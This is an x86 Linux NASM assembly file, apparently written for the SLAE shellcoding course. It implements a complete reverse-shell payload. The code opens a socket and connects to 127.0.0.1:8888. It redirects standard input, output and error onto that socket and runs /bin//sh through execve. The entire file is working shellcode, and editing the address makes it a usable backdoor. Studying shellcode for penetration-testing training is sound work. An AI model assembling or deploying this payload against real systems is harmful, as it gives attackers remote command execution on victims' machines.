; Filename: reverse_shell.nasm
; Author:  Xavier Beltran
; Course: SLAE - Pentester Academy

global _start			

section .text
_start:

xor eax, eax
xor ebx, ebx
xor ecx, ecx



; Part 1
; Create a socket
; int socketcall(int call, unsigned long *args);
; int socket(int domain, int type, int protocol);

mov al, 0x66 ; 102 number in hex
mov bl, 0x1 ; call
push ecx ; protocol
push ebx ; type
push 0x2 ; domain
mov ecx, esp ; point ecx to the top of the stack
int 0x80
mov edi, eax ; stores sockfd



; Part 2
; Connect
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

; socket syscall
xor eax, eax
mov al, 0x66
xor ebx, ebx
mov bl, 0x2

; struct sockaddr
push 0x0101017f ; ip address 127.0.0.1
push word 0xb822 ; port 8888
push bx
mov ecx, esp

; connect arguments
push 0x10
push ecx
push edi
mov ecx, esp
mov bl, 0x3 ; sys_connect

int 0x80



; Part 3
; Duplicate file descriptors
; int dup2(int oldfd, int newfd);

;mov ebx, edi ; moving sockfd
xchg ebx, edi

xor ecx, ecx
mov cl, 0x2
fd:
	mov al, 0x3f
	int 0x80
	dec ecx
	jns fd ; when ecx is 0 it will jump out of the loop



; Part 4
; Execute a shell
; int execve(const char *filename, char *const argv[],

mov al, 0xb
xor edx, edx
mov ecx, edx

push ecx
push 0x68732f6e
push 0x69622f2f

mov ebx, esp

int 0x80
